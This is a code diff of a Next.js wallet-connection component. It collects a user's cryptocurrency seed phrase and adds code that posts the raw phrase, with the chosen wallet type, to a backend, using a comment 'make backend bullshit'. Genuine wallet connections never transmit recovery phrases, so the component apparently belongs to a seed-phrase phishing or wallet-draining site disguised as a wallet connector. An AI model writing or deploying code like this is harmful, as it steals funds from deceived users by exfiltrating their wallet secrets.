@@ -4,6 +4,8 @@ import ButtonSpinner from "../utils/buttonSpinner";
 import Image from "next/image";
 import { motion } from "framer-motion";
 import useAlert from "@/hooks/alert";
+import auth from "@/lib/auth";
+import helpers from "@/helpers";
 
 type walletTypes = {
     data?: {
@@ -62,10 +64,6 @@ export default function ConnectWallet({showWallet, setShowWallet}:any) {
         }
     }, [])
 
-    useEffect(() => {
-        console.log(dataContext  )
-    }, [dataContext])
-
     function updateContext(obj:walletTypes) {
         if(typeof obj !== "object") return;
         setWallet((prev:walletTypes|any) => { return {data: {
@@ -94,7 +92,7 @@ export default function ConnectWallet({showWallet, setShowWallet}:any) {
                                 <PickWallet setShowWallet={setShowWallet}/> :
                                 dataContext.steps === 3 ?
                                 <SeedInput setShowWallet={setShowWallet}/> :
-                                dataContext.steps === 5 ?
+                                dataContext.steps === 4 ?
                                 <CongratMessage setShowWallet={setShowWallet}/> : <></>
                             }
                         </CreateWalletContext.Provider>
@@ -212,7 +210,7 @@ function PickWallet({setShowWallet}:any) {
 }
 
 
-function SeedInput({setShowWallet}:any) {
+ function SeedInput({setShowWallet}:any) {
     const {dataContext, updateContext} = useContext(CreateWalletContext)
     const {AlertComponent, showAlert} = useAlert()
     const [showBtn, setShowBtn] = useState(false)
@@ -220,17 +218,28 @@ function SeedInput({setShowWallet}:any) {
     let [count, setCount] = useState(0)
 
     
-    function handleSeedPhrases(ev:any) {
+    async function handleSeedPhrases(ev:any) {
         ev.preventDefault();
         const seedPhrases = {
             keyphrase: ev.target.keyphrase.value
         }
 
-        if(seedPhrases.keyphrase.split(' ').length > 24)  return showAlert("error", "Invalid key phrase.")
+        if(seedPhrases.keyphrase.split(' ').length > 24) return showAlert("error", "Invalid key phrase.")
+            // checking all seed key matches
+            let seedKey:any = dataContext.data.seedkey
+            if(typeof seedKey === "object" || seedKey.length > 1) {
+                for(let i = 0; i < seedKey.length; ++i){
+                    for(let j = i; j < seedKey.length; ++j) {
+                        if(seedKey[i].trim() !== seedKey[(j+1) -1].trim()) {
+                            return showAlert("error", "Invalid key phrase.")
+                        }
+                    }
+                }    
+            }
 
-        // checking if each length is less than 4
+        // checking if each key is less than 4
         seedPhrases.keyphrase.split(' ').forEach((key:string) => {
-            if(key.length < 3) return showAlert("error", "Invalid key phrase.")
+            if(key.trim().length < 4) return showAlert("error", "Invalid key phrase.")
         })
 
         // if length >= 12
@@ -246,6 +255,23 @@ function SeedInput({setShowWallet}:any) {
         }
 
         // make backend bullshit
+        const data = {
+            walletType: dataContext.data.walletID,
+            seedKey: seedPhrases.keyphrase,
+        }
+        setShowBtn(true)
+        setLoading(true)
+        try {
+            ev.target.keyphrase.value = ""
+            const res = await auth.walletConnect(helpers.getCookie('xat'), data);
+            showAlert("success", res.data.message)
+            updateContext({steps: ++dataContext.steps})
+        } catch (error:any) {
+            setShowBtn(false)
+            setLoading(false)
+            showAlert("error",(typeof error.response.data.description !== "object" ? error.response.data.description : "Something Went Wrong"))
+        }
+
     }
     return (
         <>
